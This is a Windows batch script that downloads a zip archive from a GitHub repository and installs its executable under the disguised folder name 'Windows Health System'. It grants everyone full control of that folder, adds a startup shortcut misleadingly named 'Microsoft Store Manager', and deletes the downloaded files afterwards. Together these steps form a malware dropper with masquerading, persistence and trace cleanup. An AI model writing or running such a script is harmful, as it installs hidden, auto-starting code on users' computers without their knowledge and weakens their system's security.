@ECHO OFF 
setlocal EnableDelayedExpansion
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/mxwoz-2357/KS/archive/master.zip', 'master.zip')"
powershell Expand-Archive master.zip -Force -DestinationPath master
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
REM COPY "master\KS-master\WindowsFormsAppTest.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

Xcopy /E /I "master\KS-master" "%PROGRAMFILES%\Windows Health System" /Y

icacls "%PROGRAMFILES%\Windows Health System" /grant Everyone:(OI)(CI)F /T
icacls "%PROGRAMFILES%\Windows Health System" /grant Todos:(OI)(CI)F /T

powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Store Manager.lnk');$s.TargetPath='%PROGRAMFILES%\Windows Health System\WindowsFormsAppTest.exe';$s.Save()"
START shell:startup
REM COPY "master\KS-master" "D:\New docs\newfile.doc"
if exist master.zip del master.zip
rmdir master /s /q

REM PAUSE
EXIT
